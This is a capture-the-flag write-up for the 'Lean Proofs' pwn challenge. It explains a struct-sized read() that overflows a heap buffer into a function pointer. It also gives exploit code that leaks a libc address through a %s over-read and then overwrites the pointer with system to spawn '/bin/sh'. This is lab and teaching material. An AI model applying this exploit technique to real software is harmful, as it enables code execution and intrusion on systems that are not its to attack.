# Lean Proofs — Pwn (409 pts)

> The Incredible Proof Machine. "formalized entirely in Lean, and its newer fork, Yung Lean."
> `nc 45.77.247.35 22002`

**Flag:** `CYBLTZ2026{2b0c52a2c9d9136c46de9217e44b4633928b8cf9}`

```
Partial RELRO | No canary | NX | PIE | glibc 2.39 (Ubuntu 2.39-0ubuntu8.7)
```

A one-byte-too-many `read` overflows a heap struct straight into a function pointer that is then
called with attacker-controlled data as its argument.

## The bug

```c
struct vtable {
  char lemma[0x200];
  unsigned long long left_operand;
  unsigned long long right_operand;
  int (*proof)(const char*);
};

a = malloc(sizeof(*a));
read(0, &a->left_operand, 8);
read(0, &a->right_operand, 8);
a->proof = proofs[c];                 // c in 0..4; proofs[3] == puts
read(0, a->lemma, sizeof(*a));        // reads 0x218 into a 0x200 buffer
...
a->proof(a->lemma);                   // call the (now overwritable) pointer
```

`sizeof(*a)` is `0x200 + 8 + 8 + 8 = 0x218`, but `lemma` is only `0x200` — the read spills
`0x18` bytes over `left_operand`, `right_operand`, and **`proof`**. And `proof` is invoked with
`lemma` as its only argument, so overwriting it with `system` while `lemma` starts with
`/bin/sh` is an instant shell — once we know where libc is.

## Leak: over-read the lemma `%s`

Choose proof method `4`, which sets `a->proof = proofs[3] = puts` (a libc address, since the
array is relocated at load). Then send **exactly** `0x200` bytes of lemma — filling the buffer
but *not* overflowing — with no NUL. The details print does:

```c
printf("YOUR LEMMA: %s\n", a->lemma);
```

With no terminator in `lemma`, `%s` runs on through `left_operand`, `right_operand`, and into
`proof`, leaking the stored `puts` pointer (set `left`/`right` to non-NUL filler so the read
reaches it):

```python
one(io, b'A'*8, b'B'*8, b'4\n', b'C'*0x200)         # fill, don't overflow
io.recvuntil(b'YOUR LEMMA: ')
leak  = io.recvline()[0x210:].rstrip(b'\n')          # 0x200 C + 8 A + 8 B, then puts
base  = u64(leak[:6].ljust(8,b'\0')) - libc.sym.puts
```

## Exploit: overflow `proof` → `system`

Next round, overflow with a real 0x218 payload:

```python
payload = b'/bin/sh\x00' + b'A'*(0x200-8) + p64(0) + p64(0) + p64(base + libc.sym.system)
one(io, b'A'*8, b'B'*8, b'1\n', payload)             # proof <- system, lemma = "/bin/sh"
io.sendline(b'\n')                                   # "press any key" -> a->proof(a->lemma)
# system("/bin/sh")
```

Shell as `ctf`:

```
uid=10001(ctf) gid=10001(ctf)
CYBLTZ2026{2b0c52a2c9d9136c46de9217e44b4633928b8cf9}
```

Full exploit: [`tools/lean_proofs_solve.py`](../../tools/lean_proofs_solve.py)

**Takeaway:** `read(fd, buf, sizeof(*struct))` into a buffer that is only the *first* member is a
classic off-by-struct-tail overflow. When the overwritten tail is a function pointer that is
then called with a buffer you control, the leak+overwrite collapses to a single `system(buf)`.
